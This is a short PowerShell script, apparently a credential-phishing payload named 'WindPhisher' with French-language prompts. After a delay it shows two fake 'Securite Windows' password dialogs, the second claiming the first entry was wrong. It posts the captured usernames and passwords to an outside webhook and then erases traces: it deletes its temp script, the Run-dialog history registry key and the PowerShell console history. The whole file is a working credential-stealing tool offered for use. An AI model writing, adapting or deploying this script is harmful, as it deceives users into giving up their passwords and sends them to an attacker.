$namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"

$pass2 = ""

$pass3 = ""

Start-Sleep -s 600

while ($pass2 -eq "") {
$popu = $host.ui.PromptForCredential("Securite Windows", "Entrez votre Mot de Passe de Session Windows.", "$env:USERNAME", "")
$pass2 = $popu.GetNetworkCredential().Password
}

Start-Sleep -s 1

while ($pass3 -eq "") {
$popu2 = $host.ui.PromptForCredential("Securite Windows", "Mot de passe Incorect veuillez re-essayer.", "$env:USERNAME", "")
$pass3 = $popu2.GetNetworkCredential().Password
}


$pass3 = $popu2.GetNetworkCredential().Password

$user3 = $popu2.GetNetworkCredential().Username


$pass2 = $popu.GetNetworkCredential().Password

$user2 = $popu.GetNetworkCredential().Username

$Body=@{ content = " **WindPhisher activer sur :** *$namepc*

**1 ere Popup :**
Nom d'utilisateur : *$user2* // Mot de passe windows : *$pass2*

**2eme Popup :**
Nom d'utilisateur : *$user3* // Mot de passe windows : *$pass3*"};Invoke-RestMethod -ContentType 'Application/Json' -Uri YOUR_WEBHOOK  -Method Post -Body ($Body | ConvertTo-Json);

Remove-Item  $env:temp\test.ps1 -Force -Recurse;

Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();

exit